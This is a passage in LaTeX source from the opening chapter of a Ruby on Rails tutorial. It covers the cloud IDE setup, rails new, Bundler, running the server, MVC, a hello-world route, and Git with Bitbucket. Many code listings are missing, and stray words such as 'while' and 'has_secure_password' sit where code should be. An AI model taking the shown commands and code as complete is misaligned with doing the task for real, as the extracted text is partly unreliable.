When writing a Ruby on Rails tutorial, it is tempting to rely on the scaffolding approach---it's \href{http://en.wikipedia.org/wiki/Dark_side_(Star_Wars)}{quicker, easier, more seductive}.
But the complexity and sheer amount of code in the scaffolding can be utterly overwhelming to a beginning Rails developer; you may be able to use it, but you probably won't understand it.
Following the scaffolding approach risks turning you into a virtuoso script generator with little (and brittle) actual knowledge of Rails.
In the \emph{Ruby on Rails Tutorial}, we'll take the (nearly) polar opposite approach: although Chapter~\ref{cha:a_toy_app} will develop a small toy app using scaffolding, the core of the \emph{Rails Tutorial} is the sample app, which we'll start writing in Chapter~\ref{cha:static_pages}.
At each stage of developing the sample application, we will write \emph{small, bite-sized} pieces of code---simple enough to understand, yet novel enough to be challenging.
The cumulative effect will be a deeper, more flexible knowledge of Rails, giving you a good background for writing nearly any type of web application.
<n><n>\end{aside}<n><n>\section{Introduction} % (fold)<n>\label{sec:introduction}<n><n>
Ruby on Rails (or just ``Rails'' for short) is a web development framework written in the Ruby programming language.
Since its debut in 2004, Ruby on Rails has rapidly become one of the most powerful and popular tools for building dynamic web applications.
Rails is used by companies as diverse as \href{http://airbnb.com/}{Airbnb}, \href{http://basecamp.com/}{Basecamp}, \href{http://disney.com/}{Disney}, \href{http://github.com/}{GitHub}, \href{http://hulu.com/}{Hulu}, \href{http://kickstarter.com/}{Kickstarter}, \href{http://shopify.com/}{Shopify}, \href{http://twitter.com/}{Twitter}, and the \href{http://yellowpages.com/}{Yellow Pages}.
There are also many web development shops that specialize in Rails, such as \href{http://entp.com/}{ENTP}, \href{http://thoughtbot.com/}{thoughtbot}, \href{http://pivotallabs.com/}{Pivotal Labs}, \href{http://hashrocket.com/}{Hashrocket}, and \href{http://www.happyfuncorp.com/}{HappyFunCorp}, plus innumerable independent consultants, trainers, and contractors.
What makes Rails so great?
Rails also owes much of its success to its elegant and compact design; by exploiting the malleability of the underlying \href{http://ruby-lang.org/}{Ruby} language, Rails effectively creates a \href{http://en.wikipedia.org/wiki/Domain_Specific_Language}{domain-specific language} for writing web applications. As a result, many common web programming tasks---such as generating HTML, making data models, and routing URLs---are easy with Rails, and the resulting application code is concise and readable.
Rails also adapts rapidly to new developments in web technology and \linebreak framework design.
For example, Rails was one of the first frameworks to fully digest and implement the REST architectural style for structuring web applications (which we'll be learning about throughout this tutorial).
And when other frameworks develop successful new techniques, Rails creator \href{http://loudthinking.com/}{David Heinemeier Hansson} and the \href{http://rubyonrails.org/core}{Rails core team} don't hesitate to incorporate their ideas.
Perhaps the most dramatic example is the merger of Rails and Merb, a rival Ruby web framework, so that Rails now benefits from Merb's modular design, stable \href{http://en.wikipedia.org/wiki/Application_programming_interface}{API}, and improved performance.
Finally, Rails benefits from an unusually enthusiastic and diverse community.
The results include hundreds of open-source \href{http://contributors.rubyonrails.org/}{contributors}, well-attended \href{http://railsconf.com/}{conferences}, a huge number of \href{https://rubygems.org/}{gems} (self-contained solutions to specific problems such as pagination and image upload), a rich variety of informative blogs, and a cornucopia of discussion forums and IRC channels.
The large number of Rails programmers also makes it easier to handle the inevitable application errors: the ``Google the error message'' algorithm nearly always produces a relevant blog post or discussion-forum thread.
That said, a surprising number of beginners have used the \emph{Ruby on Rails Tutorial} to learn web development from scratch, so even if you have limited experience I suggest giving it a try.
If you feel overwhelmed, you can always go back and start with one of the resources listed below.
Another strategy recommended by multiple readers is simply to do the tutorial twice; you may be surprised at how much you learned the first time (and how much easier it is the second time through).
Command
One common question when learning Rails is whether to learn Ruby first.
The answer depends on your personal learning style and how much programming experience you already have.
If you prefer to learn everything systematically from the ground up, or if you have never programmed before, then learning Ruby first might work well for you, and in this case I recommend \href{http://pragprog.com/book/ltp2/learn-to-program}{\emph{Learn to Program}} by Chris Pine and \href{http://www.amazon.com/gp/product/1430223634}{\emph{Beginning Ruby}} by Peter Cooper.
On the other hand, many beginning Rails developers are excited about making \emph{web} applications, and would rather not wait to finish a whole book on Ruby before ever writing a single web page.
If you still find this tutorial too difficult, you might try starting with \href{http://learn-rails.com/learn-ruby-on-rails.html}{\emph{Learn Ruby on Rails}} by Daniel Kehoe or \href{http://mbsy.co/7Zdc7}{One Month Rails}, both of which are geared more toward complete beginners than the \emph{Ruby on Rails Tutorial}.
At the end of this tutorial, no matter where you started, you should be ready for the many more intermediate-to-advanced Rails resources out there.
Here are some I particularly recommend:
\href{http://mbsy.co/6VQ8l}{Code School}: Good interactive online programming courses
\href{http://www.gotealeaf.com/railstutorial}{Tealeaf Academy}: A good online Rails development bootcamp (includes advanced material)
\href{http://www.thinkful.com/a/railstutorial}{Thinkful}: An online class that pairs you with a professional engineer as you work through a project-based curriculum
\href{https://pragmaticstudio.com/refs/railstutorial}{Pragmatic Studio}: Online Ruby and Rails courses from Mike and Nicole Clark.
Along with \emph{Programming Ruby} author Dave Thomas, Mike taught the first Rails course I took, way back in 2006.
\href{http://railscasts.com/}{RailsCasts} by Ryan Bates: Excellent (mostly free) Rails screencasts
\href{https://tutorials.railsapps.org/hartl}{RailsApps}: A large variety of detailed topic-specific Rails projects and tutorials
\href{http://guides.rubyonrails.org/}{Rails Guides}: Topical and up-to-date Rails references
The conventions in this book are mostly self-explanatory.
In this section, I'll mention some that may not be.
Many examples in this book use command-line commands.
For simplicity, all command line examples use a Unix-style command line prompt (a dollar sign), as follows:
hello, world
As mentioned in Section~\ref{sec:up_and_running}, I recommend that users of all operating systems (especially Windows) use a cloud development environment (Section~\ref{sec:development_environment}), which comes with a built-in Unix (Linux) command line.
This is particularly useful because Rails comes with many commands that can be run at the command line.
For example, in Section~\ref{sec:rails_server} we'll run a local development web server with the \kode{rails server} command:
$ rails server
As with the command-line prompt, the \emph{Rails Tutorial} uses the Unix convention for directory separators (i.e., a forward slash~\kode{/}).
For example, the sample application \kode{production.rb} configuration file appears as follows:
This file path should be understood as being relative to the application's root directory, which will vary by system; on the cloud IDE (Section~\ref{sec:development_environment}), it looks like this:
/home/ubuntu/workspace/sample_app/
Thus, the full path to \kode{production.rb} is
The \emph{Rails Tutorial} often shows output from various programs (shell commands, version control status, Ruby programs, etc.).
Because of the innumerable small differences between different computer systems, the output you see may not always agree exactly with what is shown in the text,<n>but this is not cause for concern.
In addition, some commands may produce errors depending on your system; rather than attempt the \href{http://en.wikipedia.org/wiki/Sisyphus}{Sisyphean} task of documenting all such errors in this tutorial, I will delegate to the ``Google the error message'' algorithm, which among other things is good practice for real-life software development.
If you run into any problems while following the tutorial, I suggest consulting the resources listed in the \href{http://www.railstutorial.org/#help}{Rails Tutorial help section}
Because the \emph{Rails Tutorial} covers testing of Rails applications, it is often helpful to know if a particular piece of code causes the test suite to fail (indicated by the color red) or pass (indicated by the color green).
while
Each chapter in the tutorial includes exercises, the completion of which is optional but recommended.
In order to keep the main discussion independent of the exercises, the solutions are not generally incorporated into subsequent code listings.
In the rare circumstance that an exercise solution is used subsequently, it is explicitly solved in the main text.
Finally, for convenience the \emph{Ruby on Rails Tutorial} adopts two conventions designed to make the many code samples easier to understand.
First, some code listings include one or more highlighted lines, as seen below:
Such highlighted lines typically indicate the most important new code in the given sample, and often (though not always) represent the difference between the present code listing and previous listings.
Second, for brevity and simplicity many of the book's code listings include vertical dots, as follows:
has_secure_password
These dots represent omitted code and should not be copied literally.
<n><n>  % section introduction (end)<n><n>  \section{Up and running} % (fold)<n>  \label{sec:up_and_running}<n><n>
Even for experienced Rails developers, installing Ruby, Rails, and all the associated supporting software can be an exercise in frustration.
Compounding the problem is the multiplicity of environments: different operating systems, version numbers, preferences in text editor and integrated development environment (IDE), etc.
The cloud IDE runs inside an ordinary web browser and hence works the same across different platforms, which is especially useful for operating systems (such as Windows) on which Rails development has historically been difficult.
If, despite the challenges involved, you would still prefer to complete the \emph{Ruby on Rails Tutorial} using a local development environment, I recommend following the instructions at \href{http://installrails.com/}{InstallRails.com}
Even then, Windows users should be warned that the Rails installer recommended by InstallRails is often out of date, and is likely to be incompatible with the present tutorial.
Considering various idiosyncratic customizations, there are probably as many development environments as there are Rails programmers.
To avoid this complexity, the \emph{Ruby on Rails Tutorial} standardizes on the excellent cloud development environment \href{http://c9.io/}{Cloud9}.
In particular, for this third edition I am pleased to partner with Cloud9 to offer a development environment specifically tailored to the needs of this tutorial.
The resulting Rails Tutorial Cloud9 workspace comes pre-configured with most of the software needed for professional-grade Rails development, including Ruby, RubyGems, Git.
(Indeed, the only big piece of software we'll install separately is Rails itself, and this is intentional (Section~\ref{sec:installing_rails}).)
The cloud IDE also includes the three essential components needed to develop web applications: a text editor, a filesystem navigator, and a command-line terminal (Figure~\ref{fig:ide_anatomy}).
Among other features, the cloud IDE text editor supports the ``Find in Files'' global search that I consider essential to navigating any large Ruby or Rails project
For example, to find the definition of a function called \kode{foo}, you can do a global search for ``def foo''.
Finally, even if you decide not to use the cloud IDE exclusively in real life (and I certainly recommend learning other tools as well), it provides an excellent introduction to the general capabilities of text editors and other development tools.
Here are the steps for getting started with the cloud development environment:
Click on ``Go to your Dashboard''
Select ``Create New Workspace''
As shown in Figure~\ref{fig:cloud9_new_workspace}, create a workspace called ``rails-tutorial'' (\emph{not} ``rails\_tutorial''), set it to ``Private to the people I invite'', and select the icon for the Rails Tutorial (\emph{not} the icon for Ruby on Rails)
Click ``Create''
After Cloud9 has finished provisioning the workspace, select it and click ``Start editing''
Because using two spaces for indentation is a near-universal convention in Ruby, I also recommend changing the editor to use two spaces instead of the default four.
As shown in Figure~\ref{fig:cloud9_two_spaces}, you can do this by clicking the gear icon in the upper right and then selecting ``Code Editor (Ace)'' to edit the ``Soft Tabs'' setting.
(Note that this takes effect immediately; you don't need to click a ``Save'' button.)
Creating a new workspace at Cloud9.
Setting Cloud9 to use two spaces for indentation.
At present, Cloud9 includes an older version of Rails that is incompatible with the present tutorial, which is one reason why it's so important to install it ourselves.
(If developing on your local system, this means using a regular terminal window; if using the cloud IDE, this means using the command-line area shown in Figure~\ref{fig:ide_anatomy}.)
Installing Rails with a specific version number.
string
Virtually all Rails applications start the same way, by running the \kode{rails new} command.
This handy command creates a skeleton Rails application in a directory of your choice.
To get started, users \emph{not} using the Cloud9 IDE recommended in Section~\ref{sec:development_environment} should make a \kode{workspace} directory for your Rails projects if it doesn't already exist (Listing~\ref{code:mkdir_rails_projects}) and then change into the directory.
Making a \kode{workspace} directory for Rails projects (unnecessary in the cloud).
$ mkdir workspace
$ cd workspace/
A crash course on the Unix command line
For readers coming from Windows or (to a lesser but still significant extent) Macintosh OS~X, the Unix command line may be unfamiliar.
Luckily, if you are using the recommended cloud environment, you automatically have access to a Unix (Linux) command line running a standard \href{http://en.wikipedia.org/wiki/Shell_(computing)}{shell command-line interface} known as \href{http://en.wikipedia.org/wiki/Bash_(Unix_shell)}{Bash}.
The basic idea of the command line is simple: by issuing short commands, users can perform a large number of operations, such as creating directories (\texttt{mkdir}), moving and copying files (\texttt{mv} and \texttt{cp}), and navigating the filesystem by changing directories (\texttt{cd}).
Although the command line may seem primitive to users mainly familiar with graphical user interfaces (GUIs), appearances are deceiving: the command line is one of the most powerful tools in the developer's toolbox.
Indeed, you will rarely see the desktop of an experienced developer without several open terminal windows running command-line shells.
The general subject is deep, but for the purposes of this tutorial we will need only a few of the most common Unix command-line commands, as summarized in Table~\ref{table:unix_commands}.
For a more in-depth treatment of the Unix command line, see \href{http://conqueringthecommandline.com/}{\emph{Conquering the Command Line}} by Mark Bates (available as a \href{http://conqueringthecommandline.com/book}{free online version} and as \href{http://conqueringthecommandline.com/#pricing}{ebooks and screencasts}).
list contents
$ ls -l
make directory
mkdir <dirname>
change directory
cd <dirname>
cd one directory up
$ cd ..
cd to home directory
move file (rename)
mv <source> <target>
$ mv README.rdoc README.md
copy file
cp <source> <target>
$ cp README.rdoc README.md
remove file
rm <file>
$ rm README.rdoc
remove empty directory
rmdir <directory>
$ rmdir workspace/
remove nonempty directory
rm -rf <directory>
$ rm -rf tmp/
cat <file>
Some common Unix commands.
The next step on both local systems and the cloud IDE is to create the first application using the command in Listing~\ref{code:rails_command}.
This ensures that the same version of Rails we installed in Listing~\ref{code:installing_rails} is used to create the first application's file structure.
(If the command in Listing~\ref{code:rails_command} returns an error like ``Could not find 'railties''', it means you don't have the right version of Rails installed, and you should double-check that you followed the command in Listing~\ref{code:installing_rails} exactly as written.)
Running \kode{rails new} (with a specific version number).
      create  README.rdoc
      create  Rakefile
      create  config.ru
      create  .gitignore
      create  Gemfile
      create  app
      create  app/assets/javascripts/application.js
      create  app/assets/stylesheets/application.css
      create  app/controllers/application_controller.rb
<n>      .
         run  bundle install
Your bundle is complete!
Use `bundle show [gemname]` to see where a bundled gem is installed.
As seen at the end of Listing~\ref{code:rails_command}, running \kode{rails new} automatically runs the \kode{bundle install} command after the file creation is done.
We'll discuss what this means in more detail starting in Section~\ref{sec:bundler}.
Notice how many files and directories the \kode{rails} command creates.
This standard directory and file structure (Figure~\ref{fig:directory_structure_rails}) is one of the many advantages of Rails; it immediately gets you from zero to a functional (if minimal) application.
Moreover, since the structure is common to all Rails apps, you can immediately get your bearings when looking at someone else's code.
A summary of the default Rails files appears in Table~\ref{table:rails_directory_structure}; we'll learn about most of these files and directories throughout the rest of this book.
In particular, starting in Section~\ref{sec:the_asset_pipeline} we'll discuss the \kode{app/assets} directory, part of the \emph{asset pipeline} that makes it easier than ever to organize and deploy assets such as cascading style sheets and JavaScript files.
The directory structure for a newly created Rails app.
Core application (app) code, including models, views, controllers, and helpers
Applications assets such as cascading style sheets (CSS), JavaScript files, and images
Binary executable files
Application configuration
Database files
doc/
Documentation for the application
Library modules
Library assets such as cascading style sheets (CSS), JavaScript files, and images
Application log files
Data accessible to the public (e.g., via web browsers), such as error pages
A program for generating code, opening console sessions, or starting a local server
Application tests
Temporary files
Third-party code such as plugins and gems
Third-party assets such as cascading style sheets (CSS), JavaScript files, and images
A brief description of the application
Utility tasks available via the \kode{rake} command
Gem requirements for this app
A list of gems used to ensure that all copies of the app use the same gem versions
A configuration file for \href{http://rack.github.io/}{Rack middleware}
Patterns for files that should be ignored by Git
A summary of the default Rails directory structure.
After creating a new Rails application, the next step is to use \emph{Bundler} to install and include the gems needed by the app.
As noted briefly in Section~\ref{sec:the_hello_application}, Bundler is run automatically (via \kode{bundle install}) by the \kode{rails} command, but in this section we'll make some changes to the default application gems and run Bundler again.
(With the cloud IDE, this involves clicking the arrow in the file navigator to open the sample app directory and double-clicking the \kode{Gemfile} icon.)
Although the exact version numbers and details may differ slightly, the results should look something like Figure~\ref{fig:cloud9_gemfile} and Listing~\ref{code:default_gemfile}.
(The code in this file is Ruby, but don't worry at this point about the syntax; Chapter~\ref{cha:rails_flavored_ruby} will cover Ruby in more depth.)
If the files and directories don't appear as shown in Figure~\ref{fig:cloud9_gemfile}, click on the file navigator's gear icon and select ``Refresh File Tree''.
(As a general rule, you should refresh the file tree any time files or directories don't appear as expected.)
The default \kode{Gemfile} open in a text editor.
The default \kode{Gemfile} in the \kode{hello\_app} directory.
# Bundle edge Rails instead:
# Use sqlite3 as the database for Active Record
# Use SCSS for stylesheets
# Use Uglifier as compressor for JavaScript assets
# Use CoffeeScript for .js.coffee assets and views
# See https://github.com/sstephenson/execjs#readme for more supported runtimes
# gem 'therubyracer', platforms: :ruby
# Use jquery as the JavaScript library
# Turbolinks makes following links in your web application faster.
# Build JSON APIs with ease.
Read more: https://github.com/rails/jbuilder
# bundle exec rake doc:rails generates the API under doc/api.
# Use ActiveModel has_secure_password
# gem 'unicorn'
# Use Capistrano for deployment
For now, we won't need any gems other than the defaults.
Unless you specify a version number to the \kode{gem} command, Bundler will automatically install the latest requested version of the gem.
This is the case, for example, in the code
There are also two common ways to specify a gem version range, which allows us to exert some control over the version used by Rails.
The first looks like this:
This installs the latest version of the \kode{uglifier} gem (which handles file compression for the asset pipeline) as long as it's greater than or equal to version~\kode{1.3.0}---even if it's, say, version~\kode{7.2}.
The second method looks like this:
This installs the gem \kode{coffee-rails} as long as it's newer than version~\kode{4.0.0} and \emph{not} newer than \kode{4.1}.
In other words,
Unfortunately, experience shows that even minor point releases can break things, so for the \emph{Ruby on Rails Tutorial} we'll err on the side of caution by including exact version numbers for all gems.
in Listing~\ref{code:gemfile_sqlite_version}.
Note that we've also taken this opportunity to arrange for the \texttt{sqlite3} gem to be included only in a development or test environment (Section~\ref{sec:rails_environments}), which prevents potential conflicts with the database used by Heroku (Section~\ref{sec:deploying}).
Gemfile
A \kode{Gemfile} with an explicit version for each Ruby gem.
As noted in Table~\ref{table:shortcuts}, you can even leave off \kode{install}, as the \kode{bundle} command by itself is an alias for \kode{bundle install}.
$ bundle install
Fetching source index for https://rubygems.org/
The \kode{bundle install} command might take a few moments, but when it's done our application will be ready to run.
Thanks to running \kode{rails new} in Section~\ref{sec:the_hello_application} and \kode{bundle install} in Section~\ref{sec:bundler}, we already have an application we can run---but how?
Happily, Rails comes with a command-line program, or \emph{script}, that runs a \emph{local} web server to assist us in developing our application.
The exact command depends on the environment you're using: on a local system, you just run \kode{rails server} (Listing~\ref{code:local_server}), whereas on Cloud9 you need to supply an additional \emph{IP binding address} and \emph{\href{http://en.wikipedia.org/wiki/TCP_and_UDP_port}{port number}} to tell the Rails server the address it can use to make the application visible to the outside world (Listing~\ref{code:cloud_server})
Normally, websites run on port 80, but this usually requires special privileges, so it's conventional to use a less restricted higher-numbered port for the development server.
If your system complains about the lack of a JavaScript runtime, visit the \href{https://github.com/sstephenson/execjs}{execjs page at GitHub} for a list of possibilities.
I particularly recommend installing \href{http://nodejs.org/}{Node.js}.
Running the Rails server on a local machine.
$ cd ~/workspace/
=> Booting WEBrick
=> Ctrl-C to shutdown server
Running the Rails server on the cloud IDE.
Whichever option you choose, I recommend running the \kode{rails server} command in a second terminal tab so that you can still issue commands in the first tab, as shown in Figure~\ref{fig:new_terminal_tab} and Figure~\ref{fig:rails_server_new_tab}.
(If you already started a server in your first tab, press Ctrl-C to shut it down.)
On a local server, point your browser at the address \href{http://localhost:3000/}{http://localhost:3000/}; on the cloud IDE, go to Share and click on the Application address to open it (Figure~\ref{fig:share_workspace}).
In either case, the result should look something like Figure~\ref{fig:riding_rails}.
Opening a new terminal tab.
Running the Rails server in a separate tab.
Sharing the local server running on the cloud workspace.
The default Rails page served by \kode{rails server}.
To see information about the first application, click on the link ``About your application's environment''.
Although exact version numbers may differ, the result should look something like Figure~\ref{fig:riding_rails_environment}.
Of course, we don't need the default Rails page in the long run, but it's nice to see it working for now.
We'll remove the default page (and replace it with a custom home page) in Section~\ref{sec:hello_world}.
The default page with the application's environment.
Even at this early stage, it's helpful to get a high-level overview of how Rails applications work (Figure~\ref{fig:MVC}).
You might have noticed that the standard Rails application structure (Figure~\ref{fig:directory_structure_rails}) has an application directory called \kode{app/} with three subdirectories: \kode{models}, \kode{views}, and \kode{controllers}.
This is a hint that Rails follows the \href{http://en.wikipedia.org/wiki/Model-view-controller}{model-view-controller} (MVC) architectural pattern, which enforces a separation between ``domain logic'' (also called ``business logic'') from the input and presentation logic associated with a graphical user interface (GUI).
In the case of web applications, the ``domain logic'' typically consists of data models for things like users, articles, and products, and the GUI is just a web page in a web browser.
When interacting with a Rails application, a browser sends a \emph{request}, which is received by a web server and passed on to a Rails \emph{controller}, which is in charge of what to do next.
In some cases, the controller will immediately render a \emph{view}, which is a template that gets converted to HTML and sent back to the browser.
More commonly for dynamic sites, the controller interacts with a \emph{model}, which is a Ruby object that represents an element of the site (such as a user) and is in charge of communicating with the database.
After invoking the model, the controller then renders the view and returns the complete web page to the browser as HTML.
A schematic representation of the model-view-controller (MVC) architecture.
If this discussion seems a bit abstract right now, worry not; we'll refer back to this section frequently.
Section~\ref{sec:hello_world} shows a first tentative application of MVC, while Section~\ref{sec:mvc_in_action} includes a more detailed discussion of MVC in the context of the toy app.
Finally, the sample app will use all aspects of MVC; we'll cover controllers and views starting in Section~\ref{sec:static_pages}, models starting in Section~\ref{sec:user_model}, and we'll see all three working together in Section~\ref{sec:a_users_resource}.
As a first application of the MVC framework, we'll make a \href{http://en.wikipedia.org/wiki/Mr_Creosote}{wafer-thin} change to the first app by adding a \emph{controller action} to render the string ``hello, world!''.
(We'll learn more about controller actions starting in Section~\ref{sec:mvc_in_action}.)
The result will be to replace the default Rails page from Figure~\ref{fig:riding_rails} with the ``hello, world'' page that is the goal of this section.
As implied by their name, controller actions are defined inside controllers.
We'll call our action \kode{hello} and place it in the Application controller.
Indeed, at this point the Application controller is the only controller we have, which you can verify by running
(We'll start creating our own controllers in Chapter~\ref{cha:a_toy_app}.)
Listing~\ref{code:hello_action} shows the resulting definition of \kode{hello}, which uses the \kode{render} function to return the text ``hello, world!''.
(Don't worry about the Ruby syntax right now; it will be covered in more depth in Chapter~\ref{cha:rails_flavored_ruby}.)
Adding a \kode{hello} action to the Application controller.
# For APIs, you may want to use :null_session instead.
protect_from_forgery
Having defined an action that returns the desired string, we need to tell Rails to use that action instead of the default page in Figure~\ref{fig:riding_rails_environment}.
To do this, we'll edit the Rails \emph{router}, which sits in front of the controller in Figure~\ref{fig:MVC} and determines where to send requests that come in from the browser.
(I've omitted the router from Figure~\ref{fig:MVC} for simplicity, but we'll discuss the router in more detail starting in Section~\ref{sec:mvc_in_action}.)
In particular, we want to change the default page, the \emph{root route}, which determines the page that is served on the \emph{root URL}.
Because it's the URL for an address like http://www.example.com/ (where nothing comes after the final forward slash), the root URL is often referred to as / (``slash'') for short.
As seen in Listing~\ref{code:default_root_route}, the Rails routes file (\kode{config/routes.rb}) includes a commented-out line that shows how to structure the root route.
Here ``welcome'' is the controller name and ``index'' is the action within that controller.
To activate the root route, uncomment this line by removing the hash character and then replace it with the code in Listing~\ref{code:hello_root_route}, which tells Rails to send the root route to the \kode{hello} action in the Application controller.
(As noted in Section~\ref{sec:conventions}, vertical dots indicate omitted code and should not be copied literally.)
The default (commented-out) root route.
# You can have the root of your site routed with "root"
# root 'welcome#index'
Setting the root route.
With the code from Listing~\ref{code:hello_action} and Listing~\ref{code:hello_root_route}, the root route returns ``hello, world!''
hello_world
Now that we have a fresh and working Rails application, we'll take a moment for a step that, while technically optional, would be viewed by experienced software developers as practically essential: placing our application source code under \emph{version control}.
Version control systems allow us to track changes to our project's code, collaborate more easily, and roll back any inadvertent errors (such as accidentally deleting files).
Knowing how to use a version control system is a required skill for every professional-grade software developer.
There are many options for version control, but the Rails community has largely standardized on \href{http://git-scm.com/}{Git}, a distributed version control system originally developed by Linus Torvalds to host the Linux kernel.
Putting your source code under version control with Git is \emph{strongly} recommended, not only because it's nearly a universal practice in the Rails world, but also because it will allow you to back up and share your code more easily (Section~\ref{sec:bitbucket}) and deploy your application right here in the first chapter (Section~\ref{sec:deploying}).
<n><n>    \subsection{Installation and setup}<n>    \label{sec:git_setup}<n><n>
The cloud IDE recommended in Section~\ref{sec:development_environment} includes Git by default, so no installation is necessary in this case.
Otherwise, \href{http://installrails.com/}{InstallRails.com} (Section~\ref{sec:up_and_running}) includes instructions for installing Git on your system.
First-time system setup
Before using Git, you should perform a set of one-time setup steps.
These are \emph{system} setups, meaning you only have to do them once per computer:
Note that the name and email address you use in your Git configuration will be available in any repositories you make public.
(Only the first two lines above are strictly necessary.
The third line is included only to ensure forward-compatibility with an upcoming release of Git.
The optional fourth line is included so that you can use \kode{co} in place of the more verbose \kode{checkout} command.
For maximum compatibility with systems that don't have \kode{co} configured, this tutorial will use the full \kode{checkout} command, but in real life I nearly always use \kode{git co}.)
First-time repository setup
Now we come to some steps that are necessary each time you create a new \emph{repository} (sometimes called a \emph{repo} for short).
First navigate to the root directory of the first app and initialize a new repository:
The next step is to add all the project files to the repository using \kode{git add -A}:
This command adds all the files in the current directory apart from those that match the patterns in a special file called \kode{.gitignore}.
The \kode{rails new} command automatically generates a \kode{.gitignore} file appropriate to a Rails project, but you can add additional patterns as well
Although we'll never need to edit it in the main tutorial, an example of adding a rule to the \kode{.gitignore} file appears in Section~\ref{sec:guard}, which is part of the optional advanced testing setup in Section~\ref{sec:advanced_testing_setup}.
The added files are initially placed in a \emph{staging area}, which contains pending changes to your project.
You can see which files are in the staging area using the \kode{status} command:
<n><n>Initial commit
.gitignore
Gemfile.lock
README.rdoc
Rakefile
(The results are long, so I've used vertical dots to indicate omitted output.)
To tell Git you want to keep the changes, use the \kode{commit} command:
[master (root-commit) df0a62f] Initialize repository
The \kode{-m} flag lets you add a message for the commit; if you omit \kode{-m}, Git will open the system's default editor and have you enter the message there.
(All the examples in this book will use the \kode{-m} flag.)
It is important to note that Git commits are \emph{local}, recorded only on the machine on which the commits occur.
We'll see how to push the changes up to a remote repository (using \kode{git push}) in Section~\ref{sec:git_commands}.
By the way, you can see a list of your commit messages using the \kode{log} command:
commit df0a62f3f091e53ffa799309b3e32c27b0b38eb4
Author: Michael Hartl <michael@michaelhartl.com>
Depending on the length of your repository's log history, you may have to type \kode{q} to quit.
If you've never used version control before, it may not be entirely clear at this point what good it does you, so let me give just one example.
D'oh!
application_controller.rb
ls: app/controllers/: No such file or directory
The \kode{-rf} flag means ``recursive force'', which recursively removes all files, directories, subdirectories, and so on, without asking for explicit confirmation of each deletion.
Let's check the status to see what changed:
no changes added to commit (use "git add" and/or "git commit -a")
We see here that a file has been deleted, but the changes are only on the ``working tree''; they haven't been committed yet.
This means we can still undo the changes using the \kode{checkout} command with the \kode{-f} flag to force overwriting the current changes:
nothing to commit (working directory clean)
The missing files and directories are back.
That's a relief!
Now that we've put our project under version control with Git, it's time to push our code up to \href{http://www.bitbucket.com}{Bitbucket}, a site optimized for hosting and sharing Git repositories.
Putting a copy of your Git repository at Bitbucket serves two purposes: it's a full backup of your code (including the full history of commits), and it makes any future collaboration much easier.
GitHub and Bitbucket
By far the two most popular sites for hosting Git repositories are GitHub and Bitbucket.
The two services share many similarities: both sites allow for Git repository hosting and collaboration, as well as offering convenient ways to browse and search repositories.
The important differences (from the perspective of this tutorial) are that GitHub offers unlimited free repositories (with collaboration) for open-source repositories while charging for private repos, whereas Bitbucket allows unlimited free private repos while charging for more than a certain number of collaborators.
Which service you use for a particular repo thus depends on your specific needs.
Previous editions of this book used GitHub because of its emphasis on supporting open-source code, but growing concerns about security have led me to recommend that \emph{all} web application repositories be private by default.
The issue is that web application repositories might contain potentially sensitive information such as cryptographic keys and passwords, which could be used to compromise the security of a site running the code.
It is possible, of course, to arrange for this information to be handled securely (by having Git ignore it, for example), but this is error-prone and requires significant expertise.
As it happens, the sample application created in this tutorial is safe for exposure on the web, but it is dangerous to rely on this fact in general.
Thus, to be as secure as possible, we will err on the side of caution and use private repositories by default.
Since GitHub charges for private repositories while Bitbucket offers an unlimited number for free, for our purposes Bitbucket is a better fit than GitHub.
Getting started with Bitbucket is simple:
\href{https://bitbucket.org/account/signup/}{Sign up for a Bitbucket account} if you don't already have one.
Copy your \href{https://en.wikipedia.org/wiki/Public-key_cryptography}{\emph{public key}} to your clipboard.
As indicated in Listing~\ref{code:cat_public_key}, users of the cloud IDE can view their public key using the \kode{cat} command, which can then be selected and copied.
If you're using your own system and see no output when running the command in Listing~\ref{code:cat_public_key}, follow the instructions on \href{https://confluence.atlassian.com/x/YwV9E}{how to install a public key on your Bitbucket account}.
Add your public key to Bitbucket by clicking on the avatar image in the upper right and selecting ``Manage account'' and then ``SSH keys'' (Figure~\ref{fig:add_public_key}).
Printing the public key using \kode{cat}.
$ cat ~/.ssh/id_rsa.pub
Adding the SSH public key.
Once you've added your public key, click on ``Create'' to \href{https://bitbucket.org/repo/create}{create a new repository}, as shown in Figure~\ref{fig:create_first_repository}.
After clicking ``Create repository'',  follow the instructions under ``Command line > I have an existing project'', which should look something like Listing~\ref{code:bitbucket_add_push}.
(If it doesn't look like Listing~\ref{code:bitbucket_add_push}, it might be because the public key didn't get added correctly, in which case I suggest trying that step again.)
When pushing up the repository, answer yes if you see the question ``Are you sure you want to continue connecting (yes/no)?''
Creating the first app repository at Bitbucket.
Adding Bitbucket and pushing up the repository.
The commands in Listing~\ref{code:bitbucket_add_push} first tell Git that you want to add Bitbucket as the \emph{origin} for your repository, and then push your repository up to the remote origin.
(Don't worry about what the \kode{-u} flag does; if you're curious, do a web search for ``git set upstream''.)
For example, the command I ran was
A Bitbucket repository page.
\label{fig:bitbucket_repository_page}}<n>\end{figure}<n><n><n>    \subsection{Branch, edit, commit, merge}<n>    \label{sec:git_commands}<n><n>
If you've followed the steps in Section~\ref{sec:bitbucket}, you might notice that Bitbucket didn't automatically detect the \kode{README.rdoc} file from our repository, instead complaining on the main repository page that there is no README present (Figure~\ref{fig:bitbucket_no_readme}).
This is an indication that the \kode{rdoc} format isn't common enough for Bitbucket to support it automatically, and indeed I and virtually every other developer I know prefer to use \emph{Markdown} instead.
In this section, we'll change the \kode{README.rdoc} file to \kode{README.md}, while taking the opportunity to add some Rails Tutorial--specific content to the README file.
In the process, we'll see a first example of the branch, edit, commit, merge workflow that I recommend using with Git
For a convenient way to visualize Git repositories, take a look at \href{http://www.sourcetreeapp.com/}{Atlassian's SourceTree app}.
Git is incredibly good at making \emph{branches}, which are effectively copies of a repository where we can make (possibly experimental) changes without modifying the parent files.
In most cases, the parent repository is the \emph{master} branch, and we can create a new topic branch by using \kode{checkout} with the \kode{-b} flag:
Switched to a new branch 'modify-README'
* modify-README
Here the second command, \kode{git branch}, just lists all the local branches, and the asterisk~\kode{*} identifies which branch we're currently on.
Note that \kode{git checkout -b modify-README} both creates a new branch and switches to it, as indicated by the asterisk in front of the \kode{modify-README} branch.
(If you set up the \kode{co} alias in Section~\ref{sec:version_control}, you can use \kode{git co -b modify-README} instead.)
See the chapter \href{http://git-scm.com/book/en/git-branching}{Git Branching in \emph{Pro Git}} for details.
In particular, the master branch is insulated from any changes we make to the topic branch, so even if we \emph{really} screw things up we can always abandon the changes by checking out the master branch and deleting the topic branch.
